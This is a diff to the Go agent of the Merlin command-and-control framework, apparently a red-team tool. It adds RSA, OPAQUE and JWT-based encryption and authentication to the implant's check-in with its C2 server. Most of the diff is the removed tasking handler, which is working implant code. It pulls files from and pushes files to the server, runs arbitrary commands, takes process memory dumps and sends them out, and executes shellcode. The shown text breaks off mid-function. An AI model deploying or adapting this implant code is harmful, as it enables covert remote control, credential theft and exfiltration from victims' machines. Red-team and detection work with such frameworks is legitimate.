@@ -20,11 +20,13 @@ package agent
 import (
 	// Standard
 	"bytes"
+	cryptorand "crypto/rand"
+	"crypto/rsa"
 	"crypto/sha1" // #nosec G505
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
-	"encoding/json"
+	"encoding/gob"
 	"fmt"
 	"io"
 	"io/ioutil"
@@ -36,14 +38,18 @@ import (
 	"path/filepath"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	// 3rd Party
+	"github.com/cretz/gopaque/gopaque"
 	"github.com/fatih/color"
 	"github.com/lucas-clemente/quic-go"
 	"github.com/lucas-clemente/quic-go/h2quic"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
+	"gopkg.in/square/go-jose.v2"
+	"gopkg.in/square/go-jose.v2/jwt"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg"
@@ -58,36 +64,41 @@ var build = "nonRelease" // build is the build number of the Merlin Agent progra
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
-	ID            uuid.UUID     // ID is a Universally Unique Identifier per agent
-	Platform      string        // Platform is the operating system platform the agent is running on (i.e. windows)
-	Architecture  string        // Architecture is the operating system architecture the agent is running on (i.e. amd64)
-	UserName      string        // UserName is the username that the agent is running as
-	UserGUID      string        // UserGUID is a Globally Unique Identifier associated with username
-	HostName      string        // HostName is the computer's host name
-	Ips           []string      // Ips is a slice of all the IP addresses assigned to the host's interfaces
-	Pid           int           // Pid is the Process ID that the agent is running under
-	iCheckIn      time.Time     // iCheckIn is a timestamp of the agent's initial check in time
-	sCheckIn      time.Time     // sCheckIn is a timestamp of the agent's last status check in time
-	Version       string        // Version is the version number of the Merlin Agent program
-	Build         string        // Build is the build number of the Merlin Agent program
-	WaitTime      time.Duration // WaitTime is how much time the agent waits in-between checking in
-	PaddingMax    int           // PaddingMax is the maximum size allowed for a randomly selected message padding length
-	MaxRetry      int           // MaxRetry is the maximum amount of failed check in attempts before the agent quits
-	FailedCheckin int           // FailedCheckin is a count of the total number of failed check ins
-	Skew          int64         // Skew is size of skew added to each WaitTime to vary check in attempts
-	Verbose       bool          // Verbose enables verbose messages to standard out
-	Debug         bool          // Debug enables debug messages to standard out
-	Proto         string        // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
-	Client        *http.Client  // Client is an http.Client object used to make HTTP connections for agent communications
-	UserAgent     string        // UserAgent is the user agent string used with HTTP connections
-	initial       bool          // initial identifies if the agent has successfully completed the first initial check in
-	KillDate      int64         // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
+	ID            uuid.UUID       // ID is a Universally Unique Identifier per agent
+	Platform      string          // Platform is the operating system platform the agent is running on (i.e. windows)
+	Architecture  string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
+	UserName      string          // UserName is the username that the agent is running as
+	UserGUID      string          // UserGUID is a Globally Unique Identifier associated with username
+	HostName      string          // HostName is the computer's host name
+	Ips           []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
+	Pid           int             // Pid is the Process ID that the agent is running under
+	iCheckIn      time.Time       // iCheckIn is a timestamp of the agent's initial check in time
+	sCheckIn      time.Time       // sCheckIn is a timestamp of the agent's last status check in time
+	Version       string          // Version is the version number of the Merlin Agent program
+	Build         string          // Build is the build number of the Merlin Agent program
+	WaitTime      time.Duration   // WaitTime is how much time the agent waits in-between checking in
+	PaddingMax    int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
+	MaxRetry      int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
+	FailedCheckin int             // FailedCheckin is a count of the total number of failed check ins
+	Skew          int64           // Skew is size of skew added to each WaitTime to vary check in attempts
+	Verbose       bool            // Verbose enables verbose messages to standard out
+	Debug         bool            // Debug enables debug messages to standard out
+	Proto         string          // Proto contains the transportation protocol the agent is using (i.e. h2 or hq)
+	Client        *http.Client    // Client is an http.Client object used to make HTTP connections for agent communications
+	UserAgent     string          // UserAgent is the user agent string used with HTTP connections
+	initial       bool            // initial identifies if the agent has successfully completed the first initial check in
+	KillDate      int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
+	RSAKeys       *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
+	PublicKey     rsa.PublicKey   // Public key (of server) used to encrypt messages
+	secret        []byte          // secret is used to perform symmetric encryption operations
+	JWT           string          // Authentication JSON Web Token
+	URL           string          // The C2 server URL
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, verbose bool, debug bool) Agent {
+func New(protocol string, url string, psk string, verbose bool, debug bool) Agent {
 	if debug {
-		message("debug", "Entering agent.init() function")
+		message("debug", "Entering agent.New function")
 	}
 	a := Agent{
 		ID:           uuid.NewV4(),
@@ -105,6 +116,7 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
 		initial:      false,
 		KillDate:     0,
+		URL:          url,
 	}
 
 	u, errU := user.Current()
@@ -154,6 +166,29 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		}
 	}
 
+	// Set encryption secret to pre-authentication pre-shared key
+	k := sha256.Sum256([]byte(psk))
+	a.secret = k[:]
+	// Generate RSA key pair
+	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
+	if rsaErr != nil {
+		if verbose {
+			message("warn", fmt.Sprintf("There was an error generating the RSA key pair:\r\n%s", rsaErr.Error()))
+		}
+		os.Exit(1)
+	}
+
+	a.RSAKeys = privateKey
+
+	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
+	agentJWT, errJWT := a.getJWT()
+	if errJWT != nil {
+		if verbose {
+			message("warn", fmt.Sprintf("there was an erreor getting the initial JWT:\r\n%s", errJWT))
+		}
+	}
+	a.JWT = agentJWT
+
 	if a.Verbose {
 		message("info", "Host Information:")
 		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
@@ -166,13 +201,13 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
 	}
 	if debug {
-		message("debug", "Leaving agent.New() function")
+		message("debug", "Leaving agent.New function")
 	}
 	return a
 }
 
 // Run instructs an agent to establish communications with the passed in server using the passed in protocol
-func (a *Agent) Run(server string) {
+func (a *Agent) Run() {
 	rand.Seed(time.Now().UTC().UnixNano())
 
 	if a.Verbose {
@@ -185,11 +220,11 @@ func (a *Agent) Run(server string) {
 		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
 			if a.initial {
 				if a.Verbose {
-					message("note", "Checking in")
+					message("note", "Checking in...")
 				}
-				go a.statusCheckIn(server, a.Client)
+				go a.statusCheckIn()
 			} else {
-				a.initial = a.initialCheckIn(server, a.Client)
+				a.initial = a.initialCheckIn(a.Client)
 			}
 			if a.FailedCheckin >= a.MaxRetry {
 				if a.Verbose {
@@ -209,129 +244,74 @@ func (a *Agent) Run(server string) {
 		totalWaitTime := a.WaitTime + timeSkew
 
 		if a.Verbose {
-			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now()))
+			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
 		}
 		time.Sleep(totalWaitTime)
 	}
 }
 
-func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
+func (a *Agent) initialCheckIn(client *http.Client) bool {
 
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
 	}
 
-	// JSON "initial" payload object
-	s := messages.SysInfo{
-		Platform:     a.Platform,
-		Architecture: a.Architecture,
-		UserName:     a.UserName,
-		UserGUID:     a.UserGUID,
-		HostName:     a.HostName,
-		Pid:          a.Pid,
-		Ips:          a.Ips,
-	}
-
-	sysInfoPayload, errP := json.Marshal(s)
-
-	if errP != nil {
-		if a.Debug {
-			message("warn", "There was an error marshaling the JSON object")
-			message("warn", errP.Error())
-		}
-	}
-
-	i := messages.AgentInfo{
-		Version:       merlin.Version,
-		Build:         build,
-		WaitTime:      a.WaitTime.String(),
-		PaddingMax:    a.PaddingMax,
-		MaxRetry:      a.MaxRetry,
-		FailedCheckin: a.FailedCheckin,
-		Skew:          a.Skew,
-		Proto:         a.Proto,
-		SysInfo:       (*json.RawMessage)(&sysInfoPayload),
-		KillDate:      a.KillDate,
-	}
-
-	agentInfoPayload, errA := json.Marshal(i)
-
-	if errA != nil {
-		if a.Debug {
-			message("warn", "There was an error marshaling the JSON object")
-			message("warn", errA.Error())
-		}
-	}
-
-	// JSON message to be sent to the server
-	g := messages.Base{
-		Version: 1.0,
-		ID:      a.ID,
-		Type:    "InitialCheckIn", // TODO Can set this to a constant in messages.go
-		Payload: (*json.RawMessage)(&agentInfoPayload),
-		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-	}
-
-	b := new(bytes.Buffer)
-	errJ := json.NewEncoder(b).Encode(g)
-	if errJ != nil {
-		if a.Verbose {
-			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
-		}
-		return false
-	}
-	if a.Verbose {
-		message("note", fmt.Sprintf("Connecting to web server at %s for initial check in.", host))
-	}
-	req, reqErr := http.NewRequest("POST", host, b)
-	if reqErr != nil {
-		if a.Verbose {
-			message("warn", reqErr.Error())
-		}
-	}
-	req.Header.Set("User-Agent", a.UserAgent)
-	req.Header.Set("Content-Type", "application/json; charset=utf-8")
-	resp, err := client.Do(req)
-
-	if err != nil {
-		a.FailedCheckin++
-		if a.Debug {
-			message("warn", "There was an error with the HTTP client while performing a POST:")
-			message("warn", err.Error())
-		}
-		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("debug", "Leaving initialCheckIn function, returning False")
-		}
-		return false
-	}
-	if a.Debug {
-		message("debug", "HTTP Response:")
-		message("debug", fmt.Sprintf("%+v", resp))
-	}
-	if resp.StatusCode != 200 {
+	// Authenticate
+	errOPAQUEAuth := a.opaqueAuthenticate()
+	if errOPAQUEAuth != nil {
 		a.FailedCheckin++
 		if a.Verbose {
+			message("warn", errOPAQUEAuth.Error())
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
-		}
-		if a.Debug {
-			message("debug", "Leaving initialCheckIn function, returning False.")
 		}
 		return false
 	}
+
+	// Send RSA keys encrypted using authentication derived secret
+	errRSA := a.rsaKeyExchange()
+	if errRSA != nil {
+		if a.Verbose {
+			message("warn", errRSA.Error())
+		}
+	}
+
+	// Now that the agent is authenticated, send in agent info
+	infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
+	if errAgentInfo != nil {
+		a.FailedCheckin++
+		if a.Verbose {
+			message("warn", errAgentInfo.Error())
+			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
+		}
+		return false
+	}
+	_, errHandler := a.messageHandler(infoResponse)
+	if errHandler != nil {
+		if a.Verbose {
+			message("warn", errHandler.Error())
+		}
+	}
+
 	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
 		if a.Verbose {
 			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
 		}
 		a.FailedCheckin = 0
-		go a.agentInfo(host, a.Client)
+		infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
+		if err != nil {
+			if a.Verbose {
+				message("warn", err.Error())
+			}
+			return false
+		}
+		_, errHandler2 := a.messageHandler(infoResponse)
+		if errHandler2 != nil {
+			if a.Verbose {
+				message("warn", errHandler2.Error())
+			}
+		}
 	}
+
 	if a.Debug {
 		message("debug", "Leaving initialCheckIn function, returning True")
 	}
@@ -339,831 +319,56 @@ func (a *Agent) initialCheckIn(host string, client *http.Client) bool {
 	return true
 }
 
-func (a *Agent) statusCheckIn(host string, client *http.Client) {
-	g := messages.Base{
+func (a *Agent) statusCheckIn() {
+	statusMessage := messages.Base{
 		Version: 1.0,
 		ID:      a.ID,
 		Type:    "StatusCheckIn",
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
 
-	b := new(bytes.Buffer)
-	errJ := json.NewEncoder(b).Encode(g)
-	if errJ != nil {
-		if a.Verbose {
-			message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s", errJ.Error()))
-		}
-		return
-	}
+	j, reqErr := a.sendMessage("POST", statusMessage)
 
-	if a.Verbose {
-		message("note", fmt.Sprintf("Connecting to web server at %s for status check in.", host))
-	}
-
-	req, reqErr := http.NewRequest("POST", host, b)
 	if reqErr != nil {
+		a.FailedCheckin++
 		if a.Verbose {
 			message("warn", reqErr.Error())
-		}
-	}
-	req.Header.Set("User-Agent", a.UserAgent)
-	req.Header.Set("Content-Type", "application/json; charset=utf-8")
-	resp, err := client.Do(req)
-
-	if err != nil {
-		if a.Debug {
-			message("warn", "There was an error with the HTTP Response:")
-			message("warn", err.Error()) // On Mac I get "read: connection reset by peer" here but not on other platforms
-		} // Only does this with a 10s Sleep
-		a.FailedCheckin++
-		if a.Verbose {
 			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
 		}
 		return
 	}
+
+	a.FailedCheckin = 0
+	a.sCheckIn = time.Now().UTC()
 
 	if a.Debug {
-		message("debug", "HTTP Response:")
-		message("debug", fmt.Sprintf("ContentLength: %d", resp.ContentLength))
-		message("debug", fmt.Sprintf("%+v", resp))
+		message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
+		message("debug", fmt.Sprintf("Message Type: %s", j.Type))
+		message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
 	}
 
-	if resp.StatusCode != 200 {
-		a.FailedCheckin++
+	// handle message
+	m, err := a.messageHandler(j)
+	if err != nil {
 		if a.Verbose {
-			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
-		}
-		if a.Debug {
-			message("warn", "There was an error communicating with the server!")
-			message("warn", fmt.Sprintf("Received HTTP Status Code: %d", resp.StatusCode))
+			message("warn", err.Error())
 		}
 		return
 	}
 
-	if resp.ContentLength != 0 {
-		var payload json.RawMessage
-		j := messages.Base{
-			Payload: &payload,
-		}
-
-		errD := json.NewDecoder(resp.Body).Decode(&j)
-		if errD != nil {
-			if a.Verbose {
-				message("warn", fmt.Sprintf("There was an error decoding the JSON message:\r\n%s",
-					errD.Error()))
-			}
-			a.FailedCheckin++
-			return
-		}
-
-		a.FailedCheckin = 0
-		a.sCheckIn = time.Now().UTC()
-
-		if a.Debug {
-			message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
-			message("debug", fmt.Sprintf("Message Type: %s", j.Type))
-			message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
-		} else if a.Verbose {
-			message("success", fmt.Sprintf("%s Message Type Received!", j.Type))
-		}
-		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
-		case "FileTransfer":
-			var p messages.FileTransfer
-			errF := json.Unmarshal(payload, &p)
-			if errF != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error unmarshalling the FileTransfer JSON "+
-						"message:\r\n%s", errF.Error()))
-				}
-			}
-
-			g := messages.Base{
-				Version: 1.0,
-				ID:      j.ID,
-				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-			}
-
-			// Agent will be downloading a file from the server
-			if p.IsDownload {
-				if a.Verbose {
-					message("note", "FileTransfer type: Download")
-				}
-				// Setup the message to submit the status of the upload
-				c := messages.CmdResults{
-					Job:    p.Job,
-					Stdout: "",
-					Stderr: "",
-				}
-
-				d, _ := filepath.Split(p.FileLocation)
-				_, directoryPathErr := os.Stat(d)
-				if directoryPathErr != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error getting the FileInfo structure for the directory %s", d))
-						message("warn", directoryPathErr.Error())
-					}
-					c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
-						"directory %s:\r\n", p.FileLocation)
-					c.Stderr += directoryPathErr.Error()
-				}
-				if c.Stderr == "" {
-					if a.Verbose {
-						message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
-					}
-					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
-					if downloadFileErr != nil {
-						c.Stderr = downloadFileErr.Error()
-						if a.Verbose {
-							message("warn", "There was an error decoding the fileBlob")
-							message("warn", downloadFileErr.Error())
-						}
-					} else {
-						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
-						if errF != nil {
-							c.Stderr = errF.Error()
-							if a.Verbose {
-								message("warn", fmt.Sprintf("There was an error writing to : %s", p.FileLocation))
-								message("warn", errF.Error())
-							}
-						} else {
-							if a.Verbose {
-								message("success", fmt.Sprintf("Successfully download file to %s", p.FileLocation))
-							}
-							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
-						}
-					}
-				}
-
-				k, err := json.Marshal(c)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error marshalling the CmdResults JSON for"+
-							" file download:\r\n%s", err.Error()))
-					}
-					break
-				}
-				g.Type = "CmdResults"
-				g.Payload = (*json.RawMessage)(&k)
-			}
-
-			// Agent will uploading a file to the server
-			if !p.IsDownload {
-				if a.Verbose {
-					message("note", "FileTransfer type: Upload")
-				}
-
-				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
-				if fileDataErr != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
-						message("warn", fileDataErr.Error())
-					}
-					errMessage := fmt.Sprintf("There was an error reading %s\r\n", p.FileLocation)
-					errMessage += fileDataErr.Error()
-					c := messages.CmdResults{
-						Job:    p.Job,
-						Stderr: errMessage,
-					}
-					if a.Verbose {
-						message("note", "Sending error message to sever.")
-					}
-					k, err := json.Marshal(c)
-					if err != nil {
-						if a.Verbose {
-							message("warn", fmt.Sprintf("There was an error marshalling the CmdResults JSON for"+
-								" file upload:\r\n%s", err.Error()))
-						}
-						break
-					}
-					g.Type = "CmdResults"
-					g.Payload = (*json.RawMessage)(&k)
-
-				} else {
-					fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
-					_, errW := io.WriteString(fileHash, string(fileData))
-					if errW != nil {
-						if a.Verbose {
-							message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
-						}
-					}
-
-					if a.Verbose {
-						message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
-							p.FileLocation,
-							len(fileData),
-							fileHash.Sum(nil)))
-					}
-					c := messages.FileTransfer{
-						FileLocation: p.FileLocation,
-						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
-						IsDownload:   true,
-						Job:          p.Job,
-					}
-
-					k, err := json.Marshal(c)
-					if err != nil {
-						if a.Verbose {
-							message("warn", fmt.Sprintf("There was an error marshalling the CmdPayload JSON "+
-								"message:\r\n%s", err.Error()))
-						}
-						break
-					}
-					g.Type = "FileTransfer"
-					g.Payload = (*json.RawMessage)(&k)
-
-				}
-			}
-			b2 := new(bytes.Buffer)
-			err1 := json.NewEncoder(b2).Encode(g)
-			if err1 != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
-						err1.Error()))
-				}
-				break
-			}
-			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
-			if respErr != nil {
-				if a.Verbose {
-					message("warn", "There was an error sending the FileTransfer message to the server")
-					message("warn", respErr.Error())
-				}
-				break
-			}
-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-				}
-			}
-		case "CmdPayload":
-			var p messages.CmdPayload
-			err2 := json.Unmarshal(payload, &p)
-			if err2 != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error unmarshalling the CmdPayload JSON "+
-						"message:\r\n%s", err2.Error()))
-				}
-			}
-			stdout, stderr := a.executeCommand(p) // TODO this needs to be its own routine so the agent can continue to function while it is going
-
-			c := messages.CmdResults{
-				Job:    p.Job,
-				Stdout: stdout,
-				Stderr: stderr,
-			}
-
-			k, err := json.Marshal(c)
-			if err != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error marshalling the CmdPayload JSON "+
-						"message:\r\n%s", err.Error()))
-				}
-				break
-			}
-			g := messages.Base{
-				Version: 1.0,
-				ID:      j.ID,
-				Type:    "CmdResults",
-				Payload: (*json.RawMessage)(&k),
-				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-			}
-			b2 := new(bytes.Buffer)
-			err3 := json.NewEncoder(b2).Encode(g)
-			if err3 != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
-						"message:\r\n%s", err3.Error()))
-				}
-				break
-			}
-			if a.Verbose {
-				message("note", fmt.Sprintf("Sending response to server: %s", stdout))
-			}
-			resp2, errR := client.Post(host, "application/json; charset=utf-8", b2)
-			if errR != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error with the POST request:\r\n%s",
-						errR.Error()))
-				}
-				break
-			}
-			if resp2.StatusCode != 200 {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d",
-						resp2.StatusCode))
-				}
-			}
-		case "ServerOk":
-			if a.Verbose {
-				message("note", "Received Server OK, doing nothing")
-			}
-		case "Module":
-			if a.Verbose {
-				message("note", "Received Agent Module Directive")
-			}
-			var p messages.Module
-			e := json.Unmarshal(payload, &p)
-			if e != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error encoding the CmdPayload JSON "+
-						"message:\r\n%s", e.Error()))
-				}
-				break
-			}
-			switch p.Command {
-			case "Minidump":
-				//args: []string{process name, pid, temppath}
-				if a.Verbose {
-					message("note", "Received Minidump request")
-				}
-				//ensure the provided args are valid
-				if len(p.Args) < 2 {
-					//not enough args
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Not enough args were provided to dump a process"))
-					}
-					break
-				}
-				process := p.Args[0]
-				pid, err := strconv.ParseInt(p.Args[1], 0, 32)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Could not parse PID as an integer:%s\r\n%s",
-							p.Args[1], err.Error()))
-					}
-					break
-				}
-
-				tempPath := ""
-				if len(p.Args) == 3 {
-					tempPath = p.Args[2]
-				}
-
-				// Get minidump
-				miniD, miniDumpErr := miniDump(tempPath, process, uint32(pid))
-
-				//copied and pasted from upload func, modified appropriately
-				if miniDumpErr != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
-							miniDumpErr.Error()))
-					}
-					errMessage := fmt.Sprintf("There was an error executing the miniDump module:\r\n%s",
-						miniDumpErr.Error())
-					c := messages.CmdResults{
-						Job:    p.Job,
-						Stderr: errMessage,
-					}
-					if a.Verbose {
-						message("note", "Sending error message to sever.")
-					}
-					k, err := json.Marshal(c)
-					if err != nil {
-						if a.Verbose {
-							message("warn", fmt.Sprintf("There was an error creating the json:\r\n%s", err.Error()))
-						}
-					}
-					g.Type = "CmdResults"
-					g.Payload = (*json.RawMessage)(&k)
-
-				} else {
-					fileHash := sha256.New()
-					_, errW := io.WriteString(fileHash, string(miniD["FileContent"].([]byte)))
-					if errW != nil {
-						if a.Verbose {
-							message("warn", fmt.Sprintf("There was an error generating the SHA256 file hash e:\r\n%s", errW.Error()))
-						}
-					}
-
-					if a.Verbose {
-						message("note", fmt.Sprintf("Uploading minidump file of size %d bytes and a SHA1 hash of %x to the server",
-							//p.FileLocation,
-							len(miniD["FileContent"].([]byte)),
-							fileHash.Sum(nil)))
-					}
-					c := messages.FileTransfer{
-						FileLocation: fmt.Sprintf("%s.%d.dmp", miniD["ProcName"], miniD["ProcID"]),
-						FileBlob:     base64.StdEncoding.EncodeToString(miniD["FileContent"].([]byte)),
-						IsDownload:   true,
-						Job:          p.Job,
-					}
-					k, err := json.Marshal(c)
-					if err != nil {
-						if a.Verbose {
-							message("warn", "There was an error creating the json")
-							message("warn", err.Error())
-						}
-					}
-					g.Type = "FileTransfer"
-					g.Payload = (*json.RawMessage)(&k)
-				}
-
-				b2 := new(bytes.Buffer)
-				err1 := json.NewEncoder(b2).Encode(g)
-				if err1 != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error encoding the JSON message:\r\n%s",
-							err1.Error()))
-					}
-					break
-				}
-				resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
-				if respErr != nil {
-					if a.Verbose {
-						message("warn", "There was an error sending the FileTransfer message to the server")
-						message("warn", respErr.Error())
-					}
-					break
-				}
-				if resp2.StatusCode != 200 {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("Message error from server. HTTP Status code: %d", resp2.StatusCode))
-					}
-				}
-
-			}
-		case "AgentControl":
-			if a.Verbose {
-				message("note", "Received Agent Control Message")
-			}
-			var p messages.AgentControl
-			err4 := json.Unmarshal(payload, &p)
-			if err4 != nil {
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error unmarshalling the AgentControl "+
-						"JSON message:\r\n%s", err4.Error()))
-				}
-			}
-
-			switch p.Command {
-			case "kill":
-				if a.Verbose {
-					message("note", "Received Agent Kill Message")
-				}
-				os.Exit(0)
-			case "sleep":
-				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent sleep time to %s", p.Args))
-				}
-				t, err := time.ParseDuration(p.Args)
-				if err != nil {
-					if a.Verbose {
-						message("warn", "There was an error changing the agent waitTime")
-						message("warn", err.Error())
-					}
-				}
-				if t > 0 {
-					a.WaitTime = t
-					a.agentInfo(host, client)
-				} else {
-					if a.Verbose {
-						message("warn", "The agent was provided with a time that was not greater than zero.")
-						message("warn", fmt.Sprintf("The provided time was: %s", t.String()))
-					}
-				}
-			case "skew":
-				t, err := strconv.ParseInt(p.Args, 10, 64)
-				if err != nil {
-					if a.Verbose {
-						message("warn", "There was an error changing the agent skew interval")
-						message("warn", err.Error())
-					}
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent skew interval to %d", t))
-				}
-				a.Skew = t
-				a.agentInfo(host, client)
-			case "padding":
-				t, err := strconv.Atoi(p.Args)
-				if err != nil {
-					if a.Verbose {
-						message("warn", "There was an error changing the agent message padding size")
-						message("warn", err.Error())
-					}
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent message maximum padding size to %d", t))
-				}
-				a.PaddingMax = t
-				a.agentInfo(host, client)
-			case "initialize":
-				if a.Verbose {
-					message("note", "Received agent re-initialize message")
-				}
-				a.initial = false
-			case "maxretry":
-
-				t, err := strconv.Atoi(p.Args)
-				if err != nil {
-					if a.Verbose {
-						message("warn", "There was an error changing the agent max retries")
-						message("warn", err.Error())
-					}
-				}
-				if a.Verbose {
-					message("note", fmt.Sprintf("Setting agent max retries to %d", t))
-				}
-				a.MaxRetry = t
-				a.agentInfo(host, client)
-			case "killdate":
-				d, err := strconv.Atoi(p.Args)
-				if err != nil {
-					if a.Verbose {
-						message("warn", fmt.Sprintf("There was an error converting the kill date to an "+
-							"integer:\r\n%s", err.Error()))
-					}
-					break
-				}
-				a.KillDate = int64(d)
-				if a.Verbose {
-					message("info", fmt.Sprintf("Set Kill Date to: %s",
-						time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
-				}
-				a.agentInfo(host, client)
-			default:
-				if a.Verbose {
-					message("warn", fmt.Sprintf("Unknown AgentControl message type received %s", p.Command))
-				}
-			}
-		case "Shellcode":
-			if a.Verbose {
-				message("note", "Received Execute shellcode command")
-			}
-
-			var s messages.Shellcode
-			var e error
-			var so string
-			var se string
-
-			errShellcode := json.Unmarshal(payload, &s)
-
-			if errShellcode != nil {
-				e = errShellcode
-			} else {
-				e = a.executeShellcode(s) // Execution method determined in function
-			}
-
-			if e != nil {
-				se = e.Error()
-				so = ""
-				if a.Verbose {
-					message("warn", fmt.Sprintf("There was an error: %s", se))
-				}
-			} else {
-				so = "Shellcode executed successfully"
-				se = ""
-			}
-
-			c := messages.CmdResults{
-				Job:    s.Job,
-				Stdout: so,
-				Stderr: se,
-			}
-
-			k, errMarshal := json.Marshal(c)
-
-			if errMarshal != nil {
-				if a.Verbose {
-					message("warn", "There was an error marshalling the CmdResults message in the shellocde section")
-					message("warn", errMarshal.Error())
-				}
-			}
-
-			g := messages.Base{
-				Version: 1.0,
-				ID:      j.ID,
-				Type:    "CmdResults",
-				Payload: (*json.RawMessage)(&k),
-				Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
-			}
-
-			b2 := new(bytes.Buffer)
-
-			errEncode := json.NewEncoder(b2).Encode(g)
-
-			if a.Verbose {
-				if errEncode != nil {
-					message("warn", fmt.Sprintf("There was an error encoding the JSON message\r\n%s", errEncode.Error()))
-					break
-				} else {
-					message("note", fmt.Sprintf("Sending response to server: %s", so))
-				}
-			}
-
-			if a.Debug {
-				message("info", fmt.Sprintf("About to send POST to server for job %s "+
-					"\r\nSTDOUT:\r\n%s\r\nSTDERR:\r\n%s", s.Job, so, se))
-			}
-
-			resp2, errPost := client.Post(host, "application/json; charset=utf-8", b2)
-
-			if errPost != nil {
-				if a.Verbose {
-					message("warn", "There was an error sending the CmdResults message to the server in the shellcode section")
-					message("warn", errPost.Error())
-				}
-				break
-			}
-
